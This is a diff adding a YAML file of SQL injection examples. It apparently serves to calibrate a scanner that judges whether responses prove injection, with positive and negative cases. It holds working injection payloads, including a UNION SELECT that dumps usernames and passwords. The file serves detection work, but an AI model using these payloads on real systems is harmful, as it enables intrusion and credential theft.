@@ -1,0 +1,31 @@
+# SQL Injection (CWE-89) — OWASP A03:2021 Injection
+attack_type: sqli
+
+positive_examples:
+  - payload: "' OR '1'='1"
+    response_snippet: "You have an error in your SQL syntax near ''1'='1'"
+    reasoning: >
+      The database echoed a raw SQL syntax error, proving the payload reached
+      the query unescaped — an attacker can craft a UNION query to dump tables.
+  - payload: "1' AND SLEEP(5)-- -"
+    response_snippet: "response returned after 5.1s vs 0.2s baseline"
+    reasoning: >
+      A payload-controlled time delay that reproduces on the injected value and
+      not on a benign one is deterministic proof of blind SQL injection.
+  - payload: "' UNION SELECT username,password FROM users-- -"
+    response_snippet: "admin | $2a$10$N9qo8uLOickgx2ZMRZo..."
+    reasoning: >
+      The response returned data from a different table (credential hashes),
+      confirming the UNION query executed against the backend database.
+
+negative_examples:
+  - payload: "' OR '1'='1"
+    response_snippet: '{"error":"Invalid input format","code":400}'
+    reasoning: >
+      A generic validation error with no database error string and no behavioural
+      change is input rejection, not injection — the query never ran the payload.
+  - payload: "1' AND SLEEP(5)-- -"
+    response_snippet: "response returned in 0.2s (same as baseline)"
+    reasoning: >
+      No time delay means the SLEEP never executed; a reflected error message
+      alone without a timing or content difference does not prove SQLi.
